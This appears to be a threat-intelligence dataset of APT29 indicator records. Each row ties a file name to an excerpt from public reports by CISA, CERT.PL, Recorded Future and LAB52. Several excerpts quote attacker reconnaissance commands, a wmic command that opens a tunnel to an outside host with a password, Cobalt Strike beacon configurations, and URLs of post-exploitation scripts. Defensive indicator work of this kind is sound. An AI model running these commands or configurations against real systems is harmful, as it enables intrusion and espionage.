1.0.0,actor--apt29,artifact--sha256:f7ff12adc6ab0fcc7683f283f231e3266a5b4fc74850a2d6504c3f98e6392e76,observation--sha256:4dff86de4ca14c390318ae31cfd367f39409d098031a3729ffa44955dd8f651a,file-name,ntoskrnl.exe,ntoskrnl.exe,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA Figure8: Refreshtokenrequest madebyGraphicalProton Source: RecordedFuture) After obtaininganewtoken, awordlist isusedtocreatearandomlynameddirectoryunder theOneDriveaccount’sApp\Teams_Test folder. Next, 2randomlynamedsubdirectoriesarecreatedtocontainC2communicationstoandfromthevictim. GraphicalProtonthengathersthevictim’ssysteminformation—includingtheir username, computer name, Windowsversion, networkconnections, andalist of runningprocesses—byrunningthefollowingcomma",
1.0.0,actor--apt29,artifact--sha256:f7ff12adc6ab0fcc7683f283f231e3266a5b4fc74850a2d6504c3f98e6392e76,observation--sha256:3a5df3c0c346705f38427ddabd7a8b1055271ce44d73a4561f20ee43f13ad4b6,file-name,ntoskrnl.exe,ntoskrnl.exe,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 10 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR Table 4: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Persistence Technique Title ID Use Scheduled Task T1053.005 SVR cyber actors may abuse Windows Task Schedule to perform task scheduling for initial or recurring execution of malicious code. Server Software Component: SQL Stored Procedures T1505.001 SVR cyber actors abuse SQL server stored procedures to maintain persistence. Boot or Logon Autostart Execu,
1.0.0,actor--apt29,artifact--sha256:f7ff12adc6ab0fcc7683f283f231e3266a5b4fc74850a2d6504c3f98e6392e76,observation--sha256:ae923b303e5a510ab32ae450208216b312fe15ca2e262b3214ee9b81ca5ed62d,file-name,ntoskrnl.exe,ntoskrnl.exe,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:49c3e90bc71db3fbc82171898504fc93842ba859b97a71351bdf1605aa8c9f2c,observation--sha256:dec9a08e574f3a4d6338eff8b9494053f842a304b97dfe8ecb125e3ecd5133b2,file-name,ole32.dll,ole32.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 13/36 QUARTERRIG’s execution is facilitated via a new entry to the Run registry key (\Software\Microsoft\Windows\CurrentVersion\Run), with the value name d as OfficeBackendWorker. The value set up in the Run key refers to the Note.exe executable - <FOLDERID_LocalAppData>\OfficeBackendWorker\Note.exe. Once the persistence is set up, the process proceeds to launch another stage. It starts off by retrieving a path to the ""ole32.dll"" file by ",
1.0.0,actor--apt29,artifact--sha256:49c3e90bc71db3fbc82171898504fc93842ba859b97a71351bdf1605aa8c9f2c,observation--sha256:d1ace09314c9e4455cd8757ab5b69228f0655d5c79b1984625b42d5d62111664,file-name,ole32.dll,ole32.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 18/36 The hash values used in WinAPI lookups are located at the beginning of the binary: Figure 8 - Hex view of the shellcode with API hashes marked in color The following excerpt shows an example of a hashing function being used to identify API names: magic_const = 0x6C8DA39E75EA6287 VirtualAlloc_h = hash_data(b""VirtualAlloc"", magic_const) kernel32_dll_h = hash_data(b""kernel32.dll"".lower(), magic_const) print(UInt64(VirtualAlloc_h ^ kern",
1.0.0,actor--apt29,artifact--sha256:dc7b950cdf1db68041d3a3c135430241d7c1e58965159169fb5dc3909fe1c5f1,observation--sha256:8c0206c2fecfdd796652f5c56178529f4033669e4b90a84aa55d82997b330821,file-name,p.php,p.php,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 18/20 Network IoCs Value Indicator Notes sawabfoundation[.]net/p.php? ip=<IP>&ua=<USER_AGENT> URL pattern ENVYSCOUT backend fingerprint collector sawabfoundation[.]net/note.html URL ENVYSCOUT sawabfoundation[.]net Domain compromised hosting used for ENVYSCOUT communitypowersports[.]com Domain CobaltStrike redirector sanjosemotosport[.]com Domain Actual CobaltStrike C2,
1.0.0,actor--apt29,artifact--sha256:dc7b950cdf1db68041d3a3c135430241d7c1e58965159169fb5dc3909fe1c5f1,observation--sha256:c839a1d1d503fc196aef90165d977c7c1c4bbf2b18215ed7e289b9940c25cdc6,file-name,p.php,p.php,candidate,,unknown,unknown,not-stated,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 7/11 Indicator Value 3rd module File Name envsrv.dll File Size 56KB MD5 2ffaa8cbc7f0d21d03d3dd897d974dba SHA1 6dff9a9f13300a5ce72a70d907ff7854599e990a SHA256 cfa65036aff012d7478694ea733e3e882cf8e18f336af5fba3ed2ef29160d45b Indicator Value 4th module (shellcode stager) File Name mschost.dll File Size 391KB MD5 5b6d8a474c556fe327004ed8a33edcdb SHA1 a677b6aa958fe02cac0730d36e8123648e02884f SHA256 86edfd6c7a2fab8c50a372494e3d5b08c032cca754396,
1.0.0,actor--apt29,artifact--sha256:a18181aeb688f0d8f31063bf55ac26b60e4817b5ae77b266fd4c62a195575dc7,observation--sha256:cc7e6dd995fb82b9a4c4720fa8fc42eba4fdf7ac481deff7e458a50fd7e7047e,file-name,p0fd798.ps1,p0fd798.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 45}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group 6.9 Javascript Injection Points jenkins.findfwd.com/sk-jspark_init.php test.directfwd.com/sk-jspark_init.php securesearchnow.com/sk-jspark_init.php alertmeter.info/sk-jspark_init.php freeresultsguide.com/sk-jspark_init.php 6.10 External Post-Exploitation Scripts 141.136.0.4/46tt83y6.ps1 173.232.146.12/Invoke-SocksProxy.psm1 176.10.118.136/pwrvw.ps1 179.43.141.188:80/46tt83y6.ps1 179.43.141.188:81/46tt83y6.ps1 179.43.141.188:82/46tt83y6.ps1 179.43.141.188:83/46tt83y,
1.0.0,actor--apt29,artifact--sha256:fdb9bf03d3ebfe13f00a1e07b85b95e7802cd11a014ac56917bcc9dad3472037,observation--sha256:e3d5e998ac032e5745b83824487f50f0fccf2fa24860ecbe6db848a74868d607,file-name,photos_and_price.exe,photos_and_price.exe,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS Once the shellcode is decrypted, it is indirectly spawned in a new thread byabusing FLS callbacks toobtain execution control as shown inFigure 14. Ratherthan specifying the shellcode’s address as thestart address for the thread, NTDLL’s rtlFlsAlloc is used instead. The rtlFlsAlloc function is used toallocatefiber local storageand takes a callbackfunction as an argument. GraphicalNeutrino creates thethread in a suspended state and updates the thread’s context to have the RCX",
1.0.0,actor--apt29,artifact--sha256:b4160fd921bc2c49fc7cd8208f21e907f1c236b6b93f625060d94eee214e34e3,observation--sha256:9f2d4d8e1b2876a3a6dca073957f0821b63ebb7324b7378cddc15d07c94b67ff,file-name,powercfg.exe,powercfg.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 14/20 Cobalt Strike Configuration The listing below presents CobaltStrike beacon configuration: 1. { 2. ""BeaconType"": [ 3. ""HTTPS"" 4. ], 5. ""Port"": 443, 6. ""SleepTime"": 60000, 7. ""MaxGetSize"": 1398102, 8. ""Jitter"": 18, 9. ""C2Server"": ""communitypowersports.com,/owa/L7k2NQpwPNLq4C2dHD6TRv00GCH1axhaWv"", 10. ""HttpPostUri"": ""/owa/o9besAWTTVJKNeyrfOOy2tn-epXE7f"", 11. ""Malleable_C2_Instructions"": [ 12. ""Base64 URL-safe decode"" 13. ], 14. ""HttpGe",
1.0.0,actor--apt29,artifact--sha256:b4160fd921bc2c49fc7cd8208f21e907f1c236b6b93f625060d94eee214e34e3,observation--sha256:cb9e902ee6e1299c9f449e2a60c06dd4ec29f0ea6337c83cb9f6671ab24fa364,file-name,powercfg.exe,powercfg.exe,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 25/36 SSH_Banner - HttpGet_Verb - GET HttpPost_Verb - POST HttpPostChunk - 0 Spawnto_x86 - %windir%\syswow64\powercfg.exe Spawnto_x64 - %windir%\sysnative\powercfg.exe CryptoScheme - 0 Proxy_Config - Not Found Proxy_User - Not Found Proxy_Password - Not Found Proxy_Behavior - Use IE settings Watermark_Hash - Not Found Watermark - 1359593325 bStageCleanup - True bCFGCaution - False KillDate - 0 bProcInject_StartRWX - True bProcInject_UseRW,
1.0.0,actor--apt29,artifact--sha256:b4160fd921bc2c49fc7cd8208f21e907f1c236b6b93f625060d94eee214e34e3,observation--sha256:1353cb8f6a483c6103fc715ed0c18a53f56d9696bcde5f41cdf986305dfa49ed,file-name,powercfg.exe,powercfg.exe,candidate,2021-10-01T00:00:00Z,month,known,same-record,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 26/36 CS Beacon #2 (March 2023) BeaconType - HTTPS Port - 443 SleepTime - 60000 MaxGetSize - 1048576 Jitter - 14 MaxDNS - Not Found PublicKey_MD5 - 4f28e1fdb295d14bfabc73bf0314a161 C2Server - gatewan.com,/c/msdownload/update/others/2021/10/se9fW4z8WJtmMyPQu UserAgent - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 HttpPostUri - /c/msdownload/update/others/2021/10/PgYhuOrusI",
1.0.0,actor--apt29,artifact--sha256:b4160fd921bc2c49fc7cd8208f21e907f1c236b6b93f625060d94eee214e34e3,observation--sha256:38917f15f97c2c692e2dd9c0e69b2803837977f2e01264c5a6c0be809e093567,file-name,powercfg.exe,powercfg.exe,candidate,2021-10-08T00:00:00Z,day,known,same-record,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 28/36 CS Beacon #3 (April 2023) BeaconType - HTTPS Port - 443 SleepTime - 60000 MaxGetSize - 1048576 Jitter - 14 MaxDNS - Not Found PublicKey_MD5 - 4f28e1fdb295d14bfabc73bf0314a161 C2Server - gatewan.com,/c/msdownload/update/others/2021/10/8PaDBDxLtokI3eH8 UserAgent - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 HttpPostUri - /c/msdownload/update/others/2021/10/PgYhuOrusIU",
1.0.0,actor--apt29,artifact--sha256:c40672ef15bec3252f423ddd769897604301602ad0e4252d3499c5c93ce369e1,observation--sha256:bfca07e507e4b8ea5e931ff1c38a32327badc4dabe2bd4eb0db23aa05358e9ec,file-name,profiles.ini,profiles.ini,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 103}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"102Easter Bunny The C2 server wants to select the sixth credential: :j65i 5 In this case, the result returned would be similar to the following: 0 http://10.0.0 1 admin1 test1234 1 http://10.0.0.1 admin2 test4567 2 http://10.0.0.1 admin3 test8901 3 http://10.0.0.1 admin4 testabcd 4 http://10.0.0.1 admin5 testABCD 5 > > http://10.0.0.1 admin6 testtest EXAMPLE OF USE This command allows you to update the connection mode (the default is authenticated proxy) stored in %AppData%\Roaming\Mozilla\Firef",
1.0.0,actor--apt29,artifact--sha256:c40672ef15bec3252f423ddd769897604301602ad0e4252d3499c5c93ce369e1,observation--sha256:95d4e00427b28bda2f3ed394d232271939a6922d9efd673f877c428cbdb75d63,file-name,profiles.ini,profiles.ini,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 84}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5283 The complete communication scheme with the C2 will be explained below: 1. CONNECTION CHECK One of the first things the malware does before contacting the C2 is to check its connectivity. To do this, it makes requests to common and legitimate pages, so that the traffic does not initially appear to be malicious. Illustration 77 . Checking domains These connection test domains are customized for each sample. Communication always takes place via the proxy server, using the credenti",
1.0.0,actor--apt29,artifact--sha256:826a14fe738bfe20f5fb29cc0c9006cf7247624fd533f356bc8da945d9c2ca01,observation--sha256:34bfd30e09ce9553cf932476bcf466d71e4857314b08bbd34944a62122da93ee,file-name,psapi.dll,psapi.dll,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS victim’s machine. The DLL is written in C   and contains only 1 export function  DeviceAll), whichsimply returns when called. The actual malicious code is implemented in a thread that is spawned inDLLMain during the DLL’s initialization. Multiple anti-analysis and evasion techniques are usedthroughout the malware including API unhooking, dynamically resolving APIs, string encryption, andsandbox evasion. When GraphicalNeutrino starts a thread, it attempts to remove any API h",
1.0.0,actor--apt29,artifact--sha256:7e1b2bbd2b2b3fddfd2acce3be20f96145857b3ee00bb56216a003f96e329c65,observation--sha256:cb21c21e7cf34360902aa19b46ff5a049d2712923361628413a6b87457b11975,file-name,pwrvw.ps1,pwrvw.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 45}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group 6.9 Javascript Injection Points jenkins.findfwd.com/sk-jspark_init.php test.directfwd.com/sk-jspark_init.php securesearchnow.com/sk-jspark_init.php alertmeter.info/sk-jspark_init.php freeresultsguide.com/sk-jspark_init.php 6.10 External Post-Exploitation Scripts 141.136.0.4/46tt83y6.ps1 173.232.146.12/Invoke-SocksProxy.psm1 176.10.118.136/pwrvw.ps1 179.43.141.188:80/46tt83y6.ps1 179.43.141.188:81/46tt83y6.ps1 179.43.141.188:82/46tt83y6.ps1 179.43.141.188:83/46tt83y,
1.0.0,actor--apt29,artifact--sha256:08c422211406235e7883cb549c4ba6d7035032fc72db20044ac7944ed2ce827d,observation--sha256:5da20c0e823021f4dd7d65e008980231e2bf5693b85d793c1f7e5b02704a941a,file-name,qjhipfahicihh.dll,qjhipfahicihh.dll,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 114}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,S2GRUPO | LAB52113 LAB52 managed to obtain various modules from the malware operators with capabilities in this case to carry out the DCSync attack [18]. 3.4.3. 14 Modules used by operators Table 15. DCSync modules MODULE NAME/ HASH (SHA1) EXPORT 1 EXPORT 2 EXPORT 3 aysklokucxnif.dll (edkb8hva) A133ECF19B8531377F7C4377086F46F6BC90BEA2 A2A241608339688B8AEC3432FD93EACF33F1A83A :q53liiet :5ddfnsfv :uuns50 qjhipfahicihh.dll (ae4s) 0E8F10CBFDDB5A2197A9C5246B66165138DF81EE :bed :j8fyvgp :nxazll lechtx,
1.0.0,actor--apt29,artifact--sha256:08c422211406235e7883cb549c4ba6d7035032fc72db20044ac7944ed2ce827d,observation--sha256:25414be181bee7ae26bd738b103134e3e0c7bff0154462e845c70c69562e197d,file-name,qjhipfahicihh.dll,qjhipfahicihh.dll,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 127}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,127 S2GRUPO | LAB52 NAME / SHA1 ACCESS aysklokucxnif.dll A133ECF19B8531377F7C4377086F46F6BC90BEA2 A2A241608339688B8AEC3432FD93EACF33F1A83A Private qjhipfahicihh.dll 0E8F10CBFDDB5A2197A9C5246B66165138DF81EE Private lechtxibhsfqj.dll 16AE9E9ABC0C4F84C5AB8D451F2A184FED0B6D46 B1B302C512185146EF793812052DB92D7F3DBD6D Private 6 .1 DCSync Modules,
1.0.0,actor--apt29,artifact--sha256:1b6c971e80b961fbe94e681d13a09dd56b1a094f230605656dd7cc93c72bcba8,observation--sha256:69163323eb88c6b9ccfa749042ffbaa65f927a53e02c07b7907d9900445b8cf8,file-name,reg.exe,reg.exe,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 17 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR references: author: date: 2023/11/15 logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: - 'AclNumsInvertHost.dll' - 'ModeBitmapNumericAnimate.dll' - 'UnregisterAncestorAppendAuto.dll' - 'DeregisterSeekUsers.dll' - 'ScrollbarHandleGet.dll' - 'PerformanceCaptionApi.dll' - 'WowIcmpRemoveReg.dll' - 'BlendMonitorStringBuild.dll' - 'HandleFrequencyAll.dll' - 'HardSwapColor.dll',
1.0.0,actor--apt29,artifact--sha256:1b6c971e80b961fbe94e681d13a09dd56b1a094f230605656dd7cc93c72bcba8,observation--sha256:f796905b3c657f1627abb0b625929654292bfd4fbbbfc7d2d1763ca0f673682e,file-name,reg.exe,reg.exe,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 20 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR description: Suspicious registry modifications author: references: date: 2023/11/15 logsource: category: registry_set product: windows detection: selection: EventID: 4657 TargetObject|contains: - 'CurrentControlSet\\Control\\Lsa\\DisableRestrictedAdmin' - 'CurrentControlSet\\Control\\Lsa\\NoLmHash' condition: selection title: Registry modification from cmd description: Registry modification from cmd author: refer,
1.0.0,actor--apt29,artifact--sha256:4d5caa7e0087aa3e969cc99606614c844b9367e23fe1843a8c0e9766e2f09957,observation--sha256:c22f43cbf042893587b1cf46a2f3f3d902113f4a4eda40a845859d65a34f0383,file-name,requiresvcruntime140.dll,requiresvcruntime140.dll,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS be version 14.30.30704.0; however, a comparison with the legitimate version of the DLL  SHA256 081a273ad809f650ebaeb91c11fcc7a1ad91232a7228f8e98b52191fe44cb06d) reveals that the file hasbeen modified. A side-by-side comparison of each DLL’s Properties window is shown inFigure 6withthe legitimate version on the left and the modified version on the right. Notably, the modified versionhas also removed Microsoft’s digital signature. Figure 6 Comparison of the legitimate (left) ",
1.0.0,actor--apt29,artifact--sha256:2e629f8170497873df1c45ee444f4fc9602a64e2b85d0304f33ae3cb76f563b3,observation--sha256:c3c8cf3bb02d7c1524ce0369c4e615a751318c27f10159147601beab85a1867f,file-name,rpt-apt29-hammertoss.pdf,rpt-apt29-hammertoss.pdf,candidate,,unknown,unknown,not-stated,,source--apt29--49eb8cd46560323f,APT29/F-Secure_Dukes_Whitepaper.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"F-Secure Whitepaper, September 2015 31 HammerDuke is a simple backdoor that is apparently designed for similar use cases as SeaDuke. Specifically, the only known infection vector for HammerDuke is to be downloaded and executed by CozyDuke onto a victim that has already been compromised by that toolset. This, together with HammerDuke’s simplistic backdoor functionality, suggests that it is primarily used by the Dukes group as a secondary backdoor left on CozyDuke victims after CozyDuke performed ",
1.0.0,actor--apt29,artifact--sha256:2e629f8170497873df1c45ee444f4fc9602a64e2b85d0304f33ae3cb76f563b3,observation--sha256:6ae2f1bfa4464cdbb9ae34859fb9059d66bc6cd29c974d315ca8b590ca13ea57,file-name,rpt-apt29-hammertoss.pdf,rpt-apt29-hammertoss.pdf,candidate,2013-02-01T00:00:00Z,month,known,same-record,,source--apt29--49eb8cd46560323f,APT29/F-Secure_Dukes_Whitepaper.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"F-Secure Whitepaper, September 2015 37 BIBLIOGRAPHY 1. The White House; Remarks By President Barack Obama In Prague As Delivered; published 5 April 2009; [Online]. Available: https://www.whitehouse.gov/the-press-office/remarks-president-barack-obama-prague-delivered 2. Wikipedia; KavKaz Center; [Online]. Available: https://en.wikipedia.org/wiki/Kavkaz_Center 3. BBC: Nato exercises ‘a dangerous move’; published 17 April 2009; [Online]. Available: http://news.bbc.co.uk/2/hi/ europe/8004399.stm 4. ",
1.0.0,actor--apt29,artifact--sha256:937fe66cd31e2bb5ee416a6e421a56ff1bd18e94cea301a9ce3aeaee1ce585d4,observation--sha256:36c36c6bde38319c0413262ef77c4c0174d6ef7b2055da8869cf0a4b36ab86e6,file-name,rr.exe,rr.exe,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 13 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR Windows Management Instrumentation T1047 SVR cyber actors executed Rsockstun either in memory or using Windows Management Instrumentation (WMI) to execute malicious commands and payloads. wmic process call create ""C:\Program Files\Windows Defender Advanced Threat Protection\Sense.exe -connect poetpages.com -pass M554- 0sddsf2@34232fsl45t31"" Table 10: SVR Cyber Actors ATT&CK Techniques for Enterprise: Command and ",
1.0.0,actor--apt29,artifact--sha256:937fe66cd31e2bb5ee416a6e421a56ff1bd18e94cea301a9ce3aeaee1ce585d4,observation--sha256:353abeecfe58929e7d5a0a37b4e6237f2376d67f1a42f1ca90babd2739f62eb8,file-name,rr.exe,rr.exe,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 7 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  Get-NetComputer  Get-NetGroup  Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""  Get-NetDiDomain  Get-AdUser  Get-DomainUser -UserName  Get-NetUser -PreauthNotRequire  Get-NetComputer | select samaccountname  Get-NetUser -SPN | select serviceprincipalname Tunneling into Compromised Environments In selected environments the SVR used an ad",
1.0.0,actor--apt29,artifact--sha256:3c35c44c2411c7bc5b0f8665fe2bf3dd28663b855c90c90181072a4b6c215563,observation--sha256:2df5b0c5368407de5786394aad949e4611f5dc75d1622578bda6c4df2833868d,file-name,runcommandsviacmd.exe,runcommandsviacmd.exe,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA Figure9  Chaskeyencryptionalgorithm Source: RecordedFuture) Next, themalwareperiodicallypollstheOneDriveaccount for newfilesintheApp\Teams_Test folder.Whenoneisfound, it isdownloaded, decoded, anddecrypted. ThemalwareexpectsthefiletobeinaBMPfileformat usingthesamebinaryencodingandChaskeycipher encryptionastheinitial C2check-in. Thepayloadof theBMPfileiscapableof requestingthemalwaretoreador writefiles, injectshellcodeintoremoteprocesses, or runcommandsviacmd.exe. Resu",
1.0.0,actor--apt29,artifact--sha256:1cf9cf267a3bb049d9e1d1182acac1380474e352a7772d0254cacaeb04ee81c7,observation--sha256:1cee7cda8ca84f2b977caa111e1a369d068b75c798cade917ebcea27e764ceb4,file-name,rundll32.exe,rundll32.exe,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 3}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS represents an ongoing interest from threat actors affiliated with the SVR and aligns with their continuedintent to gain access to strategic information from entities and organizations engaged in foreign policy.Any country with a nexus to the Ukraine crisis, particularly those with key geopolitical, economic, ormilitary relationships with Russia or Ukraine, are at increased risk of targeting. Key Judgments ● We have identified new malware used by BlueBravo, which overlaps wi",
1.0.0,actor--apt29,artifact--sha256:1cf9cf267a3bb049d9e1d1182acac1380474e352a7772d0254cacaeb04ee81c7,observation--sha256:c09537327d1e83577d7832654b3b56689e7dd322922955463d67b2da9fbf2e64,file-name,rundll32.exe,rundll32.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 9/20 msword.dll This module facilitates OPSEC (unhooking, checking for sleep() emulation, checking for process tree). The module contains a large number of inlined string decryption routines. The following listing presents (heavily) cleaned-up code of the msword.dll get export that is called by AppvIsvSubsystems64.dll: 1. __int64 get() 2. { 3. // 4. pUnhookedAPIs = getAPIs(&UnhookedAPIs); 5. pProcessModules = &UnhookedAPIs.K32EnumProcessM",
1.0.0,actor--apt29,artifact--sha256:1cf9cf267a3bb049d9e1d1182acac1380474e352a7772d0254cacaeb04ee81c7,observation--sha256:9a38b0616eec32a617d1ac5e486bdb3a422e88eea5c977ac40c383857778bbd9,file-name,rundll32.exe,rundll32.exe,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 8/24 The LNK file is used to execute SNOWYAMBER DLL via rundll32.exe. The following screenshot from a hex editor illustrates the shortcut target: Figure 8 - Content of the lnk file used to start SNOWYAMBER,
1.0.0,actor--apt29,artifact--sha256:914aec92794c936ca04d7ee658db7112008da1b620e57d575ca3480a2dfb65fe,observation--sha256:07224d45306a1f0df9e341358b9c01b7b26821de5bfc8006384fe64c4ca8c84f,file-name,runner.dll,runner.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 11/36 Reconstructed export hashing can be illustrated using the following script: def hash(x): s = 0 for x in x.encode(): s = ror(s, 13) + x return s Hashed export name found in the shellcode corresponds to “runnder_dll”. >>> hash(""runner_dll\x00"") 3137192214 3rd Stage – Intermediate Shellcode Loader – runner.dll Runner.dll is an intermediate step loader – it is similar in implementation and in functionality to hijacker.dll. Runnder.dll i",
